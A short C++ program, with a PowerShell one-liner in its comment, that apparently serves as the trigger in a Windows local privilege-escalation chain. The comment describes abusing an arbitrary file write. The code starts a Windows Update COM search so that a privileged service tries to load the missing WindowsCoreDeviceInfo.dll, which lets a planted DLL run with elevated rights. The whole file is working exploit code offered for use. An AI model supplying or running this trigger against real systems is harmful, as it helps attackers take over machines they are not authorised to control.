// Abusing arbitrary file writes , this will trigger loading of non-existent dll WindowsCoreDeviceInfo.dll
// Same thing can be done via powershell too:
// (New-Object -ComObject Microsoft.Update.Session).CreateUpdateSearcher().Search('IsInstalled=0')
#include <windows.h>
#include <wuapi.h>
#include <stdio.h>
#include <combaseapi.h>


int wmain(int argc, wchar_t** argv) {
	IUpdateSearcher* search = NULL;
	IUpdateSession* session = NULL;
	ISearchResult* result = NULL;
	HRESULT hr;
	BSTR string = SysAllocString(L"IsInstalled=1");
	hr = CoInitialize(NULL);
	hr = CoCreateInstance(CLSID_UpdateSession, NULL, CLSCTX_INPROC_SERVER, __uuidof(IUpdateSession), (LPVOID*)&session);
	if (SUCCEEDED(hr)) {
		hr = session->CreateUpdateSearcher(&search);
		if (SUCCEEDED(hr)) {
			hr = search->Search(string, &result);
			if (SUCCEEDED(hr)) {
				printf("Success!\n");
				goto cleanup;
				
			}
			else
			{
				printf("Error: %8.8x\n", hr);
				goto cleanup;
			}
		}
		else
		{
			printf("Error: %8.8x\n", hr);
			goto cleanup;
		}
	}
	else
	{
		printf("Error: %8.8x\n", hr);
		goto cleanup;
	}
cleanup:
	if (session) {
		
		session->Release();
	}
	if (search) {
		search->Release();
	}
	if (result) {
		result->Release();
	}
	CoUninitialize();
}
